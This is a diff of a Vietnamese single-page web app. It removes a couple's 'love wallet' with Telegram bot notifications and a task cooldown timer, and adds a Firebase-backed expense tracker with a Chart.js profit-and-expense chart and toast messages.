-                cancelButtonText: 'Để sau',
-                confirmButtonColor: '#007bff'
-            }).then((result) => {
-                if (result.isConfirmed) {
-                    sendTelegramText(`💸 <b>YÊU CẦU RÚT TIỀN!</b>\n\n💵 <b>Số tiền:</b> ${balance.toLocaleString('vi-VN')} VNĐ`);
-                    balance = 0;
-                    localStorage.setItem('loveWalletBalance', balance);
-                    document.getElementById('balanceDisplay').innerText = '0 VNĐ';
-                    Swal.fire('Thành công', 'Đã báo cho anh yêu chuyển tiền!', 'success');
-                }
-            });
-        }
-
-        // Cập nhật giao diện đếm ngược 12H
-        function checkCooldownUI() {
-            let lastDoneTime = localStorage.getItem('lastDoneTime');
-            const alertBox = document.getElementById('cooldownAlert');
-            
-            clearInterval(clockInterval);
-
-            if (lastDoneTime) {
-                const hours12 = 12 * 60 * 60 * 1000;
-                
-                const updateClock = () => {
-                    let timePassed = Date.now() - parseInt(lastDoneTime);
-                    let timeLeft = hours12 - timePassed;
-                    
-                    if (timeLeft > 0) {
-                        alertBox.style.display = 'block';
-                        document.getElementById('taskListSection').style.display = 'none';
-                        document.getElementById('currentTaskSection').style.display = 'none';
-
-                        let h = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                        let m = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-                        let s = Math.floor((timeLeft % (1000 * 60)) / 1000);
-                        
-                        h = (h < 10) ? "0" + h : h;
-                        m = (m < 10) ? "0" + m : m;
-                        s = (s < 10) ? "0" + s : s;
-                        
-                        document.getElementById('countdownTimer').innerText = `${h}:${m}:${s}`;
-                    } else {
-                        alertBox.style.display = 'none';
-                        clearInterval(clockInterval);
-                        checkCurrentTask(); // Hiển thị lại task list
+            financeChart = new Chart(ctx, {
+                type: 'bar',
+                data: {
+                    labels: ['Hôm Nay', 'Tháng Này', 'Tất Cả'],
+                    datasets: [
+                        { label: 'Lợi Nhuận', data: [stats.day.profit>0?stats.day.profit:0, stats.month.profit>0?stats.month.profit:0, stats.all.profit>0?stats.all.profit:0], backgroundColor: '#10B981', borderRadius: 4, barPercentage: 0.8 },
+                        { label: 'Đã Chi', data: [stats.day.expense>0?stats.day.expense:0, stats.month.expense>0?stats.month.expense:0, stats.all.expense>0?stats.all.expense:0], backgroundColor: '#F43F5E', borderRadius: 4, barPercentage: 0.8 }
+                    ]
+                },
+                options: {
+                    responsive: true, maintainAspectRatio: false,
+                    plugins: {
+                        legend: { position: 'bottom', labels: { boxWidth: 10, padding: 10, font: { size: 10, weight: 'bold' } } },
+                        tooltip: { callbacks: { label: function(context) { return formatMoney(context.raw); } } }
+                    },
+                    scales: {
+                        y: { 
+                            beginAtZero: true, grid: { color: '#f1f5f9' }, 
+                            ticks: { font: { size: 10 }, callback: function(value) {
+                                if (value >= 1000000) return (value / 1000000) + 'tr';
+                                if (value >= 1000) return (value / 1000) + 'k';
+                                return value;
+                            }}
+                        },
+                        x: { grid: { display: false } }
                     }
-                };
-
-                updateClock();
-                clockInterval = setInterval(updateClock, 1000);
-            } else {
-                alertBox.style.display = 'none';
-            }
-        }
-
-        // Gửi tin nhắn nhanh
-        function sendQuickMessage() {
-            const msgInput = document.getElementById('quickMessage');
-            const msg = msgInput.value.trim();
-            if (!msg) {
-                Swal.fire('Thiếu thông tin', 'Vui lòng nhập nội dung tin nhắn trước khi gửi.', 'warning');
-                return;
-            }
-
-            Swal.fire({
-                title: 'Đang gửi...',
-                allowOutsideClick: false,
-                didOpen: () => { Swal.showLoading(); }
-            });
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: TELEGRAM_CHAT_ID, 
-                    text: `💬 <b>TIN NHẮN MỚI TỪ APP:</b>\n\n${msg}`, 
-                    parse_mode: 'HTML' 
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    msgInput.value = '';
-                    Swal.fire('Thành công!', 'Tin nhắn của bạn đã được mã hóa và gửi đi.', 'success');
-                } else {
-                    Swal.fire('Lỗi', 'Không thể gửi tin nhắn.', 'error');
                 }
-            })
-            .catch(err => {
-                console.error(err);
-                Swal.fire('Lỗi mạng', 'Vui lòng kiểm tra lại kết nối mạng.', 'error');
             });
         }
 
-        // Khởi chạy app
-        initApp();
+        window.submitExpense = async function(e) {
+            e.preventDefault();
+            const btnSubmit = document.getElementById('btn-submit-expense');
+            const catInput = document.getElementById('expense-category');
+            const otherInput = document.getElementById('expense-other');
+            const amountInput = document.getElementById('expense-amount');
+
+            let name = catInput.value;
+            if (name === 'Khác') {
+                name = otherInput.value.trim();
+                if (!name) {
+                    showToast("Vui lòng nhập mục đích khác!", "warning");
+                    otherInput.focus();
+                    return;
+                }
+            }
+
+            let amount = Number(amountInput.value.trim()) || 0;
+            if (amount > 0 && amount < 10000) amount *= 1000;
+
+            btnSubmit.disabled = true;
+            btnSubmit.innerHTML = `<i data-lucide="loader" class="w-4 h-4 animate-spin"></i>`;
+            lucide.createIcons();
+
+            try {
+                if (window.firebaseDb && window.fbAddDoc && window.fbCollection) {
+                    await window.fbAddDoc(window.fbCollection(window.firebaseDb, "chitieu"), {
+                        tenChiTieu: name,
+                        soTien: amount,
+                        thoiGian: new Date().toISOString()
+                    });
+                    showToast("Đã ghi sổ!", "success");
+                    
+                    // Reset Form
+                    catInput.value = ""; 
+                    otherInput.value = "";
+                    otherInput.classList.add('hidden');
+                    otherInput.removeAttribute('required');
+                    amountInput.value = "";
+                    
+                    await window.loadAllData();
+                }
+            } catch (err) {
+                console.error(err);
+                showToast("Lỗi!", "danger");
+            } finally {
+                btnSubmit.disabled = false;
+                btnSubmit.innerHTML = `<i data-lucide="plus-circle" class="w-4 h-4"></i><span>Lưu</span>`;
+                lucide.createIcons();
+            }
+        }
+
+        window.deleteExpenseRecord = async function(id) {
+            if (!confirm("Xóa khoản chi này? (Sẽ hoàn lại tiền vào Tồn Quỹ)")) return;
+            try {
+                if (window.firebaseDb && window.fbDoc && window.fbDeleteDoc) {
+                    await window.fbDeleteDoc(window.fbDoc(window.firebaseDb, "chitieu", id));
+                    showToast("Đã xóa!", "success");
+                    await window.loadAllData();
+                }
+            } catch (err) {
+                console.error(err);
+                showToast("Lỗi xóa!", "danger");
+            }
+        }
+
+        function formatMoney(amount) {
+            return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
+        }
+
+        function formatDate(isoString) {
+            if (!isoString) return "";
+            const d = new Date(isoString);
+            return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')} - ${d.getDate().toString().padStart(2, '0')}/${(d.getMonth() + 1).toString().padStart(2, '0')}`;
+        }
+
+        function showToast(message, type = 'success') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            
+            let bgClass = "bg-emerald-500 text-white shadow-emerald-100";
+            let iconName = "check-circle-2";
+            if (type === 'danger') {
+                bgClass = "bg-red-500 text-white shadow-red-100";
+                iconName = "alert-circle";
+            } else if (type === 'warning') {
+                bgClass = "bg-amber-500 text-white shadow-amber-100";
+                iconName = "info";
+            }
+
+            toast.className = `${bgClass} flex items-center space-x-2 px-3 py-2.5 rounded-lg shadow-lg text-xs font-semibold transform translate-y-2 opacity-0 transition duration-300 pointer-events-auto mb-2`;
+            toast.innerHTML = `<i data-lucide="${iconName}" class="w-3.5 h-3.5 shrink-0"></i><span>${message}</span>`;
+            
+            container.appendChild(toast);
+            lucide.createIcons();
+
+            setTimeout(() => { toast.classList.remove('translate-y-2', 'opacity-0'); }, 50);
+            setTimeout(() => {
+                toast.classList.add('translate-y-2', 'opacity-0');
+                setTimeout(() => { toast.remove(); }, 300);
+            }, 2500); 
+        }
     </script>
 </body>
 </html>
